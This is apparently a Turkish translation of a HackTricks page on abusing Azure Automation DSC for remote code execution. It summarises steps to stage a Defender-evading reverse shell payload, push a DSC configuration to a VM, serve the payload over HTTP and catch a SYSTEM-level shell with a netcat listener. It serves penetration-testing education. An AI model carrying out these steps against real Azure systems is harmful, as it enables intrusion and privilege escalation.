# Az - Durum Yapılandırma Uzaktan Kod Çalıştırma

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek HackTricks ve HackTricks Cloud github depolarına katkıda bulunun.**

</details>
{% endhint %}

**Tam gönderiyi kontrol edin: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### Uzak Sunucu (C2) Altyapı Hazırlığı ve Adımlarının Özeti

#### Genel Bakış
Bu süreç, Windows Defender'ı atlatmak için tasarlanmış `RevPS.ps1` adlı değiştirilmiş bir Nishang `Invoke-PowerShellTcp.ps1` yükünü barındırmak için uzaktan bir sunucu altyapısı kurmayı içerir. Yük, IP'si `40.84.7.74` olan bir Kali Linux makinesinden basit bir Python HTTP sunucusu kullanılarak sunulmaktadır. İşlem birkaç adımda gerçekleştirilir:

#### Adım 1 — Dosyalar Oluşturma
- **Gerekli Dosyalar:** İki PowerShell betiği gereklidir:
1. `reverse_shell_config.ps1`: Yükü alıp çalıştıran bir Desired State Configuration (DSC) dosyası. [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1) adresinden temin edilebilir.
2. `push_reverse_shell_config.ps1`: Yapılandırmayı sanal makineye yayınlamak için bir betik, [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1) adresinde bulunmaktadır.
- **Özelleştirme:** Bu dosyalardaki değişkenler ve parametreler, kaynak adları, dosya yolları ve sunucu/yük kimlikleri de dahil olmak üzere kullanıcının belirli ortamına uyarlanmalıdır.

#### Adım 2 — Yapılandırma Dosyasını Sıkıştırma
- `reverse_shell_config.ps1` bir `.zip` dosyasına sıkıştırılarak Azure Depolama Hesabına transfer için hazır hale getirilir.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Adım 3 — Depolama Bağlamını Ayarlayın ve Yükleyin
- Sıkıştırılmış yapılandırma dosyası, Azure'ın Set-AzStorageBlobContent komut dosyasını kullanarak önceden belirlenmiş bir Azure Depolama konteynerine, azure-pentest'e yüklenir.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Adım 4 — Kali Kutusunu Hazırlayın
- Kali sunucusu, RevPS.ps1 yükünü bir GitHub deposundan indirir.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- Betik, ters shell için hedef Windows VM ve portu belirtmek üzere düzenlenmiştir.

#### Adım 5 — Yapılandırma Dosyasını Yayımla
- Yapılandırma dosyası yürütülür ve ters shell betiği belirtilen konuma Windows VM üzerinde dağıtılır.

#### Adım 6 — Yükü Barındır ve Dinleyiciyi Kur
- Bir Python SimpleHTTPServer, yükü barındırmak için başlatılır, ayrıca gelen bağlantıları yakalamak için bir Netcat dinleyici kurulur.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- Zamanlanmış görev, payload'ı yürüterek SİSTEM düzeyinde ayrıcalıklar elde eder.

#### Sonuç

Bu sürecin başarılı bir şekilde yürütülmesi, kimlik bilgilerinin sızdırılması veya saldırının birden fazla sanal makineye genişletilmesi gibi birçok olasılığı beraberinde getirir. Kılavuz, Azure Automation DSC alanında devam eden öğrenmeyi ve yaratıcılığı teşvik eder.

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking püf noktalarını paylaşarak PR'ler göndererek [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
